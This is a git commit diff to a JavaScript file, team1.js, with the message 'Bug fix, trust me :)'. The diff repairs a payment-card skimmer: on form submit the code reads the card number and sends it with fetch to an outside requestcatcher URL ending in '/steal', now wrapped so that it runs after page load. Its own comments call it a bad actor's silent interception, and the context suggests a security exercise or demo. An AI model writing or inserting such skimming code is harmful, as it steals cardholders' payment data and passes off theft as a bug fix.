2ea100a194b8ad43fdd7133c0dd0121a18979bc8
hf-josh <jdavies@highfield.co.uk>
2026-03-16 14:18:38 +0000

    Bug fix, trust me :)

--- team1.js
+++ team1.js
@@ -1,7 +1,9 @@
 console.log("I'm a bad actor :)");
 
 // Silently intercept card data on form submit
-document.getElementById('payment-form').addEventListener('submit', function() {
-    const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
-    fetch('https://jd.requestcatcher.com/steal?card=' + encodeURIComponent(cardNumber));
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('payment-form').addEventListener('submit', function() {
+        const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
+        fetch('https://jd.requestcatcher.com/steal?card=' + encodeURIComponent(cardNumber));
+    });
 });
